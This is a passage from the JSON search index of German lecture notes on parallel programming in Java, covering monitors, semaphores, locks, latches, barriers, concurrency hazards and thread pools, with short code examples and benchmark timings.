            "text": "Monitor: Gegenseitiger Ausschluss + Wait   Signal Mechanismus  Nur ein Thread kann \"im Monitor\" sein  Spezieller Wartebereich f\u00fcr Threads, die auf eine Bedingung warten  Sie werden signalisiert, sobald die Bedingung erf\u00fcllt ist   class   BankAccount   { \n     private   int   balance   =   0 ; \n     public   synchronized   void   withdraw ( int   amount ) \n         throws   InterruptedException   { \n         while   ( amount     balance )   { \n             wait (); \n         } \n         balance   -=   amount ; \n         } \n     public   synchronized   void   deposit ( int   amount )   { \n         balance   +=   amount ; \n         notifyAll (); \n     }  }    wait()  setzt den Thread in die Warteschlange zum Warten auf eine Bedingung  notifyAll()  weckt alle im Monitor wartenden Thread auf  Beh\u00e4lt aber den Monitor-Lock f\u00fcr weitere Instruktionen (\"Single and Continue\")    Ein aufgeweckter Thread geht wieder in den \"\u00e4usseren\" Warteraum, genau wie alle anderen eintrittswilligen Threads     Wieso funktioniert das?  wait()  setzt sich in den \"Warteraum\" und gibt den Monitor (den Lock auf das Objekt) frei    notify()  weckt einen  beliebigen  Thread im \"Warteraum\" auf  Die Reihenfolge im \"Warteraum\" ist in Java nicht spezifiziert (in .NET FIFO)  Spurious Wakeup: Ein wartender Thread kann \"f\u00e4lschlicherweise\" aufgeweckt werden, ohne dass  notify  aufgerufen wurde  Problem von POSIX-Threads", 
            "title": "Wait &amp; Signal"
        }, 
        {
            "location": "/ParProg/3_Thread-Synchronisation/#fallstricke-beim-java-monitor", 
            "text": "", 
            "title": "Fallstricke beim Java Monitor"
        }, 
        {
            "location": "/ParProg/3_Thread-Synchronisation/#wait-mit-if", 
            "text": "Nach dem  wait()  muss die Bedingung wieder \u00fcberpr\u00fcft werden  In der Zwischenzeit k\u00f6nnte nach dem  notify()  und vor dem Eintreten die Bedingung wieder invalidiert werden  Daher:  while (!conditioin) { wait(); }", 
            "title": "Wait mit If"
        }, 
        {
            "location": "/ParProg/3_Thread-Synchronisation/#single-notify", 
            "text": "notify()  weckt ein beliebiger einzelner Thread auf  Wenn immer ein falscher Thread aufgeweckt wird, terminiert das Programm nie  L\u00f6sung:  notifyAll()  verwenden", 
            "title": "Single-Notify"
        }, 
        {
            "location": "/ParProg/3_Thread-Synchronisation/#effizenz-probleme", 
            "text": "notifyAll()  weckt alle auf, bei vielen Threads ist das viel Overhead f\u00fcr die \u00dcberpr\u00fcfung der Bedingung  Keine Fairness: Keine Warteschlange spezifiziert  Signal-and-Continue: Informierte muss neu anstehen und k\u00f6nnen st\u00e4ndig \u00fcberholt werden  Auch bei FIFO (.NET) nicht garantiert fair", 
            "title": "Effizenz-Probleme"
        }, 
        {
            "location": "/ParProg/4_Synchronisationsprimitiven/", 
            "text": "Note\n\n\nQuiz letzte Vorlesung: \nnotify()\n reicht, da nur auf eine Bedingung gewartet wird, und nur ein einziger Thread darf weiter machen (One-In/One-Out)\n\n\n\n\nSymaphor\n\n\n\n\nVon Dijkstra, kommt von Eisenbahn-Signalen\n\n\nIst ein Z\u00e4hler mit der Anzahl noch freier Ressourcen\n\n\nacquire()\n: Beziehe freie Ressource oder warte, Z\u00e4hler dekrementieren\n\n\nrelease()\n: Ressource freigeben, Z\u00e4hler inkrementieren\n\n\nMonitor-Nachbau ist nicht garantiert fair, weil \nnotify()\n ein beliebiger Thread weckt\n\n\nBin\u00e4re Sempahore: \n\u01f9ew Semaphore(1)\n, gegenseitiger Ausschluss\n\n\nKann in Java auch negativ initialisiert werden (nicht bei .NET)\n\n\nFaire Semaphore: \nnew Sempahore(N, true)\n\n\nBenutzt FIFO-Warteschlange\n\n\nAllerdings langsamer als \"unfaire\" Variante\n\n\n\n\n\n\nAnwendung BoundedBuffer:\n\n\nMit Semaphoren deutlich schneller als mit Monitor (ca. 3x)\n\n\nGrund: \nnotifyAll()\n fallen weg, es m\u00fcssen nicht immer alle Threads aufgeweckt werden\n\n\n\"Faire\" Variante ist etwa gleich schnell\n\n\n\n\n\n\n\n\nLock \n Condition\n\n\n\n\nSpezialfall des Monitors\n\n\nVerschiedene Wartelisten f\u00fcr mehrere Bedingungen\n\n\nNotify geht auf eine der \"Warter\u00e4ume\"\n\n\nIn Java unabh\u00e4ngig vom Java Monitor, muss selbst nachgebaut werden\n\n\nAuf einen Lock (analog \nsynchronized\n) k\u00f6nnen mehrer Conditions definiert werden\n\n\nLock kann \"fair\" sein\n\n\n\n\nprivate\n \nLock\n \nmonitor\n \n=\n \nnew\n \nReentrantLock\n(\ntrue\n);\n\n\nprivate\n \nCondition\n \nnonFull\n \n=\n \nmonitor\n.\nnewCondition\n();\n\n\nprivate\n \nCondition\n \nnonEmpty\n \n=\n \nmonitor\n.\nnewCondition\n();\n\n\n\n\n\n\npublic\n \nvoid\n \nput\n(\nT\n \nitem\n)\n \nthrows\n \nInterruptedException\n \n{\n\n    \nmonitor\n.\nlock\n();\n\n    \ntry\n \n{\n\n        \nwhile\n \n(\nqueue\n.\nsize\n()\n \n==\n \nCapacity\n)\n \n{\n \n            \nnonFull\n.\nawait\n();\n\n        \n}\n\n        \nqueue\n.\nadd\n(\nitem\n);\n\n        \nnonEmpty\n.\nsignal\n();\n\n    \n}\n \nfinally\n \n{\n \nmonitor\n.\nunlock\n();\n \n}\n\n\n}\n\n\n// Analog f\u00fcr get()\n\n\n\n\n\n\n\n\nsignal()\n notifiziert ein beliebiger Thread f\u00fcr diese Condition, \nsignalAll()\n alle\n\n\n\u00dcberholen ist weiterhin ein Problem, da die aufgeweckten Threads wieder in den \"normalen\" Warteraum kommen\n\n\n\n\nRead-Write Lock\n\n\n\n\nErlaube parallele Lese-Zugriffe\n\n\nSchreibzugriffe mit gegenseitigem Ausschluss\n\n\n\n\nReadWriteLock\n \nrwLock\n \n=\n \nnew\n \nReentrantReadWriteLock\n(\ntrue\n);\n\n\nrwLock\n.\nreadLock\n().\nlock\n();\n\n\n// read-only accesses\n\n\nrwLock\n.\nreadLock\n().\nunlock\n();\n\n\n\nrwLock\n.\nwriteLock\n().\nlock\n();\n\n\n// write (and read) accesses\n\n\nrwLock\n.\nwriteLock\n().\nunlock\n();\n\n\n\n\n\n\n\n\nDer WriteLock ist gleich wie der Lock bei Lock \n Condition\n\n\n\n\nCount Down Latch\n\n\n\n\nZeitlicher Synchronisationspunkt von mehreren Threads\n\n\n\n\nN Threads warten auf Control-Thread, Control-Thread wartet auf N Threads und gibt \"Startsignal\"\n\n\n\n\n\n\nCount Down Latch hat Z\u00e4hler und wartet, bis er 0 wird\n\n\n\n\nThreads k\u00f6nnen Z\u00e4hler dekrementieren mit \ncountDown()\n\n\nFairness spielt keine Rolle, da alle wartenden Threads \"auf einmal\" durchkommen\n\n\n\n\nCountDownLatch\n \ncarsReady\n \n=\n \nnew\n \nCountDownLatch\n(\nN\n);\n\n\nCountDownLatch\n \nstartSignal\n \n=\n \nnew\n \nCountDownLatch\n(\n1\n);\n\n\n\n// N Cars\n\n\ncarsReady\n.\ncountDown\n();\n\n\nstartSignal\n.\nawait\n();\n\n\n\n// 1 RaceControl\n\n\ncarsReady\n.\nawait\n();\n\n\nstartSignal\n.\ncountDown\n();\n\n\n\n\n\n\n\n\nGeht auch mit Multi-Release/-Aquire Semaphore\n\n\nCountDown l\u00e4sst sich nicht wieder hochsetzen, weil man nicht weiss, wieviele Threads auf die \"Barriere\" warten werden. Sobald man also auf 0 ist und ein Thread den Count wieder erh\u00f6ht, weiss man nicht, ob jemals ein weiterer Thread zu \nawait()\n kommen w\u00fcrde\n\n\n\n\nCyclic Barrier\n\n\n\n\nN Threads warten aufeinander\n\n\nawait()\n blockiert, bis N Threads \nawait()\n aufgerufen haben\n\n\nKann wiederverwendet werden\n\n\nIm Unterschied zum CountDownLatch weiss man genau, wieviele Threads warten werden\n\n\n\n\nCyclicBarrier\n \ngameRound\n \n=\n \nnew\n \nCyclicBarrier\n(\nN\n);\n\n\n\n// Bei N Players:               \n\n\nwhile\n \n(\ntrue\n)\n \n{\n\n    \ngameRound\n.\nawait\n();\n\n    \n// play concurrently with others\n\n\n}\n\n\n// Mehrere Runden\n\n\n\n\n\n\n\n\nWenn ein Thread im \nawait()\n eine Exception wirft, ist die Barriere kaputt\n\n\nPhaser\n: Kann zus\u00e4tzlich Teilnehmer im nachhinein an- und abmelden\n\n\n\n\nExchanger\n\n\n\n\n\"Rende-vouz\": Barriere mit zwei Parteien und tauschen etwas aus\n\n\n`exchange(v) Blockiert, bis anderer Thread auch exchange() aufruft\n\n\nLiefert Argument x des jeweils anderen Threads\n\n\n\n\n\u00dcbung\n\n\n\n\nSemaphore sind schneller als Lock \n Condition\n\n\nLock \n condition lohnt sich nicht wegen Overhead der Implementierung\n\n\n\n\nTEST SERIES: 1 producers 1 consumers (capacity 5)\nTest WarehouseWithMonitor unfair\nTotal time: 1394 ms\nTest WarehouseWithSemaphore unfair\nTotal time: 1262 ms\nTest WarehouseWithSemaphore fair\nTotal time: 1103 ms\nTest WarehouseWithLockCondition unfair\nTotal time: 1119 ms\nTest WarehouseWithLockCondition fair\nTotal time: 3392 ms\nTEST SERIES: 5 producers 5 consumers (capacity 5)\nTest WarehouseWithMonitor unfair\nTotal time: 2913 ms\nTest WarehouseWithSemaphore unfair\nTotal time: 1524 ms\nTest WarehouseWithSemaphore fair\nTotal time: 2362 ms\nTest WarehouseWithLockCondition unfair\nTotal time: 4983 ms\nTest WarehouseWithLockCondition fair\nTotal time: 5368 ms\nTEST SERIES: 1 producers 10 consumers (capacity 5)\nTest WarehouseWithMonitor unfair\nTotal time: 4602 ms\nTest WarehouseWithSemaphore unfair\nTotal time: 1449 ms\nTest WarehouseWithSemaphore fair\nTotal time: 2014 ms\nTest WarehouseWithLockCondition unfair\nTotal time: 5603 ms\nTest WarehouseWithLockCondition fair\nTotal time: 19024 ms\nTEST SERIES: 100 producers 100 consumers (capacity 5)\nTest WarehouseWithMonitor unfair\nTotal time: 9808 ms\nTest WarehouseWithSemaphore unfair\nTotal time: 1732 ms\nTest WarehouseWithSemaphore fair\nTotal time: 2621 ms\nTest WarehouseWithLockCondition unfair\nTotal time: 15325 ms\nTest WarehouseWithLockCondition fair\nTotal time: 78283 ms\nTEST SERIES: 1 producers 10 consumers (capacity 1000000)\nTest WarehouseWithMonitor unfair\nTotal time: 1 ms\nTest WarehouseWithSemaphore unfair\nTotal time: 0 ms\nTest WarehouseWithSemaphore fair\nTotal time: 2 ms\nTest WarehouseWithLockCondition unfair\nTotal time: 0 ms\nTest WarehouseWithLockCondition fair\nTotal time: 0 ms", 
            "title": "4 Synchronisationsprimitiven"
        }, 
        {
            "location": "/ParProg/4_Synchronisationsprimitiven/#symaphor", 
            "text": "Von Dijkstra, kommt von Eisenbahn-Signalen  Ist ein Z\u00e4hler mit der Anzahl noch freier Ressourcen  acquire() : Beziehe freie Ressource oder warte, Z\u00e4hler dekrementieren  release() : Ressource freigeben, Z\u00e4hler inkrementieren  Monitor-Nachbau ist nicht garantiert fair, weil  notify()  ein beliebiger Thread weckt  Bin\u00e4re Sempahore:  \u01f9ew Semaphore(1) , gegenseitiger Ausschluss  Kann in Java auch negativ initialisiert werden (nicht bei .NET)  Faire Semaphore:  new Sempahore(N, true)  Benutzt FIFO-Warteschlange  Allerdings langsamer als \"unfaire\" Variante    Anwendung BoundedBuffer:  Mit Semaphoren deutlich schneller als mit Monitor (ca. 3x)  Grund:  notifyAll()  fallen weg, es m\u00fcssen nicht immer alle Threads aufgeweckt werden  \"Faire\" Variante ist etwa gleich schnell", 
            "title": "Symaphor"
        }, 
        {
            "location": "/ParProg/4_Synchronisationsprimitiven/#lock-condition", 
            "text": "Spezialfall des Monitors  Verschiedene Wartelisten f\u00fcr mehrere Bedingungen  Notify geht auf eine der \"Warter\u00e4ume\"  In Java unabh\u00e4ngig vom Java Monitor, muss selbst nachgebaut werden  Auf einen Lock (analog  synchronized ) k\u00f6nnen mehrer Conditions definiert werden  Lock kann \"fair\" sein   private   Lock   monitor   =   new   ReentrantLock ( true );  private   Condition   nonFull   =   monitor . newCondition ();  private   Condition   nonEmpty   =   monitor . newCondition ();   public   void   put ( T   item )   throws   InterruptedException   { \n     monitor . lock (); \n     try   { \n         while   ( queue . size ()   ==   Capacity )   {  \n             nonFull . await (); \n         } \n         queue . add ( item ); \n         nonEmpty . signal (); \n     }   finally   {   monitor . unlock ();   }  }  // Analog f\u00fcr get()    signal()  notifiziert ein beliebiger Thread f\u00fcr diese Condition,  signalAll()  alle  \u00dcberholen ist weiterhin ein Problem, da die aufgeweckten Threads wieder in den \"normalen\" Warteraum kommen", 
            "title": "Lock &amp; Condition"
        }, 
        {
            "location": "/ParProg/4_Synchronisationsprimitiven/#read-write-lock", 
            "text": "Erlaube parallele Lese-Zugriffe  Schreibzugriffe mit gegenseitigem Ausschluss   ReadWriteLock   rwLock   =   new   ReentrantReadWriteLock ( true );  rwLock . readLock (). lock ();  // read-only accesses  rwLock . readLock (). unlock ();  rwLock . writeLock (). lock ();  // write (and read) accesses  rwLock . writeLock (). unlock ();    Der WriteLock ist gleich wie der Lock bei Lock   Condition", 
            "title": "Read-Write Lock"
        }, 
        {
            "location": "/ParProg/4_Synchronisationsprimitiven/#count-down-latch", 
            "text": "Zeitlicher Synchronisationspunkt von mehreren Threads   N Threads warten auf Control-Thread, Control-Thread wartet auf N Threads und gibt \"Startsignal\"    Count Down Latch hat Z\u00e4hler und wartet, bis er 0 wird   Threads k\u00f6nnen Z\u00e4hler dekrementieren mit  countDown()  Fairness spielt keine Rolle, da alle wartenden Threads \"auf einmal\" durchkommen   CountDownLatch   carsReady   =   new   CountDownLatch ( N );  CountDownLatch   startSignal   =   new   CountDownLatch ( 1 );  // N Cars  carsReady . countDown ();  startSignal . await ();  // 1 RaceControl  carsReady . await ();  startSignal . countDown ();    Geht auch mit Multi-Release/-Aquire Semaphore  CountDown l\u00e4sst sich nicht wieder hochsetzen, weil man nicht weiss, wieviele Threads auf die \"Barriere\" warten werden. Sobald man also auf 0 ist und ein Thread den Count wieder erh\u00f6ht, weiss man nicht, ob jemals ein weiterer Thread zu  await()  kommen w\u00fcrde", 
            "title": "Count Down Latch"
        }, 
        {
            "location": "/ParProg/4_Synchronisationsprimitiven/#cyclic-barrier", 
            "text": "N Threads warten aufeinander  await()  blockiert, bis N Threads  await()  aufgerufen haben  Kann wiederverwendet werden  Im Unterschied zum CountDownLatch weiss man genau, wieviele Threads warten werden   CyclicBarrier   gameRound   =   new   CyclicBarrier ( N );  // Bei N Players:                 while   ( true )   { \n     gameRound . await (); \n     // play concurrently with others  }  // Mehrere Runden    Wenn ein Thread im  await()  eine Exception wirft, ist die Barriere kaputt  Phaser : Kann zus\u00e4tzlich Teilnehmer im nachhinein an- und abmelden", 
            "title": "Cyclic Barrier"
        }, 
        {
            "location": "/ParProg/4_Synchronisationsprimitiven/#exchanger", 
            "text": "\"Rende-vouz\": Barriere mit zwei Parteien und tauschen etwas aus  `exchange(v) Blockiert, bis anderer Thread auch exchange() aufruft  Liefert Argument x des jeweils anderen Threads", 
            "title": "Exchanger"
        }, 
        {
            "location": "/ParProg/4_Synchronisationsprimitiven/#ubung", 
            "text": "Semaphore sind schneller als Lock   Condition  Lock   condition lohnt sich nicht wegen Overhead der Implementierung   TEST SERIES: 1 producers 1 consumers (capacity 5)\nTest WarehouseWithMonitor unfair\nTotal time: 1394 ms\nTest WarehouseWithSemaphore unfair\nTotal time: 1262 ms\nTest WarehouseWithSemaphore fair\nTotal time: 1103 ms\nTest WarehouseWithLockCondition unfair\nTotal time: 1119 ms\nTest WarehouseWithLockCondition fair\nTotal time: 3392 ms\nTEST SERIES: 5 producers 5 consumers (capacity 5)\nTest WarehouseWithMonitor unfair\nTotal time: 2913 ms\nTest WarehouseWithSemaphore unfair\nTotal time: 1524 ms\nTest WarehouseWithSemaphore fair\nTotal time: 2362 ms\nTest WarehouseWithLockCondition unfair\nTotal time: 4983 ms\nTest WarehouseWithLockCondition fair\nTotal time: 5368 ms\nTEST SERIES: 1 producers 10 consumers (capacity 5)\nTest WarehouseWithMonitor unfair\nTotal time: 4602 ms\nTest WarehouseWithSemaphore unfair\nTotal time: 1449 ms\nTest WarehouseWithSemaphore fair\nTotal time: 2014 ms\nTest WarehouseWithLockCondition unfair\nTotal time: 5603 ms\nTest WarehouseWithLockCondition fair\nTotal time: 19024 ms\nTEST SERIES: 100 producers 100 consumers (capacity 5)\nTest WarehouseWithMonitor unfair\nTotal time: 9808 ms\nTest WarehouseWithSemaphore unfair\nTotal time: 1732 ms\nTest WarehouseWithSemaphore fair\nTotal time: 2621 ms\nTest WarehouseWithLockCondition unfair\nTotal time: 15325 ms\nTest WarehouseWithLockCondition fair\nTotal time: 78283 ms\nTEST SERIES: 1 producers 10 consumers (capacity 1000000)\nTest WarehouseWithMonitor unfair\nTotal time: 1 ms\nTest WarehouseWithSemaphore unfair\nTotal time: 0 ms\nTest WarehouseWithSemaphore fair\nTotal time: 2 ms\nTest WarehouseWithLockCondition unfair\nTotal time: 0 ms\nTest WarehouseWithLockCondition fair\nTotal time: 0 ms", 
            "title": "\u00dcbung"
        }, 
        {
            "location": "/ParProg/5_Gefahren/", 
            "text": "Gefahren der Nebenl\u00e4ufigkeit\n\n\nRace Condition\n\n\n\n\nUngen\u00fcgend synchronisierte Zugriffe auf gemeinsame Ressourcen\n\n\n\n\n\n\nJe nach Thread-Verzahnung und Timing unterschiedliche Ergebnisse\n\n\nOft ist die Ursache ein \nData Race\n\n\nEs gibt auch Race Conditions ohne Data Race\n\n\noder Data Race ohne Race Condition\n\n\nProgramm funktioniert dann zwar, ist aber formal falsch\n\n\n\n\n\n\n\n\nData Race\n\n\n\n\nMehrere Threads greifen auf selben Speicher (Var, Array, ...) zu\n\n\nMindestens ein Write-Zugriff von einem Thread ist involviert\n\n\nIst ein formaler Fehler: Einfacher zu erkennen als generelle Race Condition\n\n\n\n\nSynchronisation\n\n\nVerzichtbare F\u00e4lle\n\n\n\n\nWenn Objekte nur gelesen werden (immutable Objects)\n\n\nConfinement: Object geh\u00f6rt zu einer Zeit nur einem Thread\n\n\nThread Confinement\n: Objekt lebt nur bei einem Thread (\"privat\")\n\n\nObject Confinement\n: Einkapsung in synchronisiertes Objekt, Zugriff auf Objekt nur mit synchronisierten Methoden\n\n\n\n\n\n\n\n\nThread Confinement\n\n\nnew\n \nThread\n(()\n \n-\n \n{\n\n    \nOutputStream\n \noutput\n \n=\n \nnew\n \nFileOutputStream\n();\n\n    \ntry\n \n{\n\n        \ndoService\n(\noutput\n);\n\n    \n}\n \nfinally\n \n{\n\n        \noutput\n.\nclose\n();\n\n    \n}\n\n\n}).\nstart\n();\n\n\n\n\n\n\nKapselungsbr\u00fcche\n\n\n\n\nInneres Objekt von aussen zugreifbar\n\n\nR\u00fcckgabe auf Referenz eines inneren Objekts\n\n\nEine innere Referenz wird irgendwo rein \"installiert\", z.B. in eine Liste, die per Parameter mitgegeben wird\n\n\nInneres Objekt gibt selber \nthis\n raus\n\n\n\n\nThread-Safety\n\n\n\n\nKeine klare Definition\n\n\nHeisst Klassen und Methoden, die f\u00fcr sich intern synchronisiert sind\n\n\nKeine Synchronisierung \u00fcber mehrere Methoden -\n Race Conditions immer noch m\u00f6glich\n\n\nImmer Spezifikation pr\u00fcfen, was thread-safe ist\n\n\nSynchronisation reicht nicht immer, Iteration ist z.B. nicht synchronisiert\n\n\n\n\nJava Collections\n\n\n\n\nAlte Collections \nVector\n, \nStack\n und \nHashtable\n sind thread-safe\n\n\nModerne Collections nicht! (\nHashSet\n, \nArrayList\n, \nHashMap\n, ...)\n\n\nGrund: Synchronisation ist teuer! Thread-Safety wird meist nicht ben\u00f6tigt\n\n\n\n\n\n\nEigene \nConcurrentCollections\n sind thread-safe: \nConcurrentHashMap\n, \nConcurrentLinkedQueue\n, ...\n\n\nIteration ist \"schwach konsistent\": Es gibt keine Garantie, dass alle Updates gelesen werden\n\n\n\n\nDeadlocks\n\n\n\n\nGegenseitiges Aussperren von Threads\n- Einige Threads sperren sich gegenseitig so, dass keiner von denen weitermachen kann\n- Programm mit potentiellem Deadlock ist inkorrekt\n- \nLivelocks\n: Deadlocks, die st\u00e4ndig eine Bedingung pr\u00fcfen, also weiterhin CPU verbrauchen\n\n\n\n\nDeadlocks erkennen\n\n\n\n\nWenn Deadlock eingetreten ist, gibt es im Betriebsmittelgraph (Holt-Diagrams, Bsys1) einen Zyklus\n\n\nF\u00fcr einen Deadlock m\u00fcssen \nalle 4 Voraussetzungen erf\u00fcllt sein\n\n\nNested Locks\n\n\nZyklische Warteabh\u00e4ngigkeiten\n\n\nGegenseitiger Ausschluss (Locks)\n\n\nSperren ohne Timeout / Abbruch\n\n\n\n\n\n\n\n\nDeadlocks vermeiden\n\n\n\n\nZiel: Einer der vier Voraussetzungen verhindern\n\n\nDie geschachtelten Ressourcen nur in aufsteigender Reihenfolge reservieren (locken)\n\n\nVerhindert zyklische Warteabh\u00e4ngigkeiten\n\n\n\n\n\n\nGrobgranulare Locks w\u00e4hlen\n\n\nz.B. \"ganze Bank sperren bei Kontozugriff\"\n\n\nVerhindert geschachtelte Locks\n\n\nIst aber evtl. sehr ineffizient\n\n\n\n\n\n\n\n\nStarvation\n\n\n\n\nKontinuierliche Fortschrittsbehinderung von Threads wegen Fairness-Probleme\n- Es gibt kein Deadlock, die ressource wird immer frei, aber der wartende Thread wird st\u00e4ndig von anderen Threads \u00fcberholt und die Bedingung wird nie erf\u00fcllt\n- Liveness Problem: Threads werden f\u00fcr unbestimmte Zeit aufgehalten, aber nicht unendlich lange\n- Java-Monitor ist Starvation-Anf\u00e4llig, weil es keine Fairness gibt\n- Vermeidung: Fairness einbauen, z.B. bei Java Semaphoren. L\u00e4nger wartende Threads haben Vortritt\n\n\n\n\nErkennung / Vermeidung\n\n\nDesign Aspekte", 
            "title": "5 Gefahren"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#gefahren-der-nebenlaufigkeit", 
            "text": "", 
            "title": "Gefahren der Nebenl\u00e4ufigkeit"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#race-condition", 
            "text": "Ungen\u00fcgend synchronisierte Zugriffe auf gemeinsame Ressourcen    Je nach Thread-Verzahnung und Timing unterschiedliche Ergebnisse  Oft ist die Ursache ein  Data Race  Es gibt auch Race Conditions ohne Data Race  oder Data Race ohne Race Condition  Programm funktioniert dann zwar, ist aber formal falsch", 
            "title": "Race Condition"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#data-race", 
            "text": "Mehrere Threads greifen auf selben Speicher (Var, Array, ...) zu  Mindestens ein Write-Zugriff von einem Thread ist involviert  Ist ein formaler Fehler: Einfacher zu erkennen als generelle Race Condition", 
            "title": "Data Race"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#synchronisation", 
            "text": "", 
            "title": "Synchronisation"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#verzichtbare-falle", 
            "text": "Wenn Objekte nur gelesen werden (immutable Objects)  Confinement: Object geh\u00f6rt zu einer Zeit nur einem Thread  Thread Confinement : Objekt lebt nur bei einem Thread (\"privat\")  Object Confinement : Einkapsung in synchronisiertes Objekt, Zugriff auf Objekt nur mit synchronisierten Methoden", 
            "title": "Verzichtbare F\u00e4lle"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#thread-confinement", 
            "text": "new   Thread (()   -   { \n     OutputStream   output   =   new   FileOutputStream (); \n     try   { \n         doService ( output ); \n     }   finally   { \n         output . close (); \n     }  }). start ();", 
            "title": "Thread Confinement"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#kapselungsbruche", 
            "text": "Inneres Objekt von aussen zugreifbar  R\u00fcckgabe auf Referenz eines inneren Objekts  Eine innere Referenz wird irgendwo rein \"installiert\", z.B. in eine Liste, die per Parameter mitgegeben wird  Inneres Objekt gibt selber  this  raus", 
            "title": "Kapselungsbr\u00fcche"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#thread-safety", 
            "text": "Keine klare Definition  Heisst Klassen und Methoden, die f\u00fcr sich intern synchronisiert sind  Keine Synchronisierung \u00fcber mehrere Methoden -  Race Conditions immer noch m\u00f6glich  Immer Spezifikation pr\u00fcfen, was thread-safe ist  Synchronisation reicht nicht immer, Iteration ist z.B. nicht synchronisiert", 
            "title": "Thread-Safety"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#java-collections", 
            "text": "Alte Collections  Vector ,  Stack  und  Hashtable  sind thread-safe  Moderne Collections nicht! ( HashSet ,  ArrayList ,  HashMap , ...)  Grund: Synchronisation ist teuer! Thread-Safety wird meist nicht ben\u00f6tigt    Eigene  ConcurrentCollections  sind thread-safe:  ConcurrentHashMap ,  ConcurrentLinkedQueue , ...  Iteration ist \"schwach konsistent\": Es gibt keine Garantie, dass alle Updates gelesen werden", 
            "title": "Java Collections"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#deadlocks", 
            "text": "Gegenseitiges Aussperren von Threads\n- Einige Threads sperren sich gegenseitig so, dass keiner von denen weitermachen kann\n- Programm mit potentiellem Deadlock ist inkorrekt\n-  Livelocks : Deadlocks, die st\u00e4ndig eine Bedingung pr\u00fcfen, also weiterhin CPU verbrauchen", 
            "title": "Deadlocks"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#deadlocks-erkennen", 
            "text": "Wenn Deadlock eingetreten ist, gibt es im Betriebsmittelgraph (Holt-Diagrams, Bsys1) einen Zyklus  F\u00fcr einen Deadlock m\u00fcssen  alle 4 Voraussetzungen erf\u00fcllt sein  Nested Locks  Zyklische Warteabh\u00e4ngigkeiten  Gegenseitiger Ausschluss (Locks)  Sperren ohne Timeout / Abbruch", 
            "title": "Deadlocks erkennen"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#deadlocks-vermeiden", 
            "text": "Ziel: Einer der vier Voraussetzungen verhindern  Die geschachtelten Ressourcen nur in aufsteigender Reihenfolge reservieren (locken)  Verhindert zyklische Warteabh\u00e4ngigkeiten    Grobgranulare Locks w\u00e4hlen  z.B. \"ganze Bank sperren bei Kontozugriff\"  Verhindert geschachtelte Locks  Ist aber evtl. sehr ineffizient", 
            "title": "Deadlocks vermeiden"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#starvation", 
            "text": "Kontinuierliche Fortschrittsbehinderung von Threads wegen Fairness-Probleme\n- Es gibt kein Deadlock, die ressource wird immer frei, aber der wartende Thread wird st\u00e4ndig von anderen Threads \u00fcberholt und die Bedingung wird nie erf\u00fcllt\n- Liveness Problem: Threads werden f\u00fcr unbestimmte Zeit aufgehalten, aber nicht unendlich lange\n- Java-Monitor ist Starvation-Anf\u00e4llig, weil es keine Fairness gibt\n- Vermeidung: Fairness einbauen, z.B. bei Java Semaphoren. L\u00e4nger wartende Threads haben Vortritt", 
            "title": "Starvation"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#erkennung-vermeidung", 
            "text": "", 
            "title": "Erkennung / Vermeidung"
        }, 
        {
            "location": "/ParProg/5_Gefahren/#design-aspekte", 
            "text": "", 
            "title": "Design Aspekte"
        }, 
        {
            "location": "/ParProg/6_Thread_Pools/", 
            "text": "Thread Pools\n\n\n\n\nNote\n\n\nQuiz letzte Woche: Keine Garantie, dass Lock jemals erfolgreich ist -\n Starvation. \n\n\n\n\nKonzept\n\n\n\n\nTasks Queue\n mit Tasks von potentiell parallele Arbeitspakete\n\n\nQueue weiss nicht, wieviele Threads im Pool arbeiten, Tasks m\u00fcssen also beliebig parallelisierbar sein\n\n\n\n\n\n\n\n\nThread Pool\n ist eine beschr\u00e4nkte Anzahl von Worker-Threads, die die Tasks aus der Queue holen und ausf\u00fchren\n\n\n\n\n\n\nVorteile\n\n\n\n\nBeschr\u00e4nkte Anzahl Threads (konfigurierbar, normalerweise Anzahl logische CPU-Cores)\n\n\nThreads werden recycled, weniger Overhead f\u00fcr Thread-Erzeugung und -Freigabe\n\n\nH\u00f6here Abstraktion: Task-Beschreibung wird von Task-Ausf\u00fchrung getrennt (muss z.B. nicht zwinged nebenl\u00e4ufig sein)\n\n\n\n\n\n\n\n\nEinschr\u00e4nkungen\n\n\n\n\nTasks d\u00fcrfen nicht auf andere warten, sie m\u00fcssen unabh\u00e4ngig voneinander sein\n\n\nSonst k\u00f6nnte es zu Deadlocks kommen, wenn alle Threads auf andere Tasks in der Queue warten\n\n\n\n\n\n\nTasks m\u00fcssen komplett fertig laufen, bevor der Worker Thread ein anderer Task beginnt (\nRun to Completion\n)\n\n\nAusser bei geschachtelten Tasks (Sub-Tasks)\n\n\nGrund: Thread f\u00fchrt einen Stack. Weitere Tasks w\u00fcrden den Stack f\u00fcllen und k\u00f6nnten nur wieder in umgekehrter Reihenfolge \"gepoppt\" werden. Bei geschachtelten Tasks weiss man, dass der \"obere\" Task auf dem Stack zuerst fertig laufen muss\n\n\n\n\n\n\n\n\n\n\n\n\nFunktionsweise\n\n\nTask Lancierung\n\n\nForkJoinPool\n \nthreadPool\n \n=\n \nnew\n \nForkJoinPool\n();\n\n\n\n\n\n\n\n\nBietet Task Queue und Threads (default: Anzahl Cores)\n\n\n\n\nFuture\nInteger\n \nfuture\n \n=\n \nthreadPool\n.\nsubmit\n(()\n \n-\n \n{\n\n    \nint\n \nvalue\n \n=\n \n\u2026\n;\n\n    \n// long calculation\n\n    \nreturn\n \nvalue\n;\n\n\n});\n\n\n\n\n\n\n\n\nTask wird eingereiht in die Task-Queue\n\n\nGeneric Type von \nFuture\nT\n ist Typ des R\u00fcckgabewert\n\n\n\n\nFuture Konzept\n\n\n\n\nDas \nFuture\n-Objekt wird ben\u00f6tigt, um asynchron Tasks zu submitten. Das Ergebnis wird erst sp\u00e4ter rein geschrieben\n\n\nT result = future.get()\n blockiert, bis Task beendet ist und ruft das Ergebnis ab (analog \njoin\n)\n\n\nWenn Tasks mit unbehandelter Exception 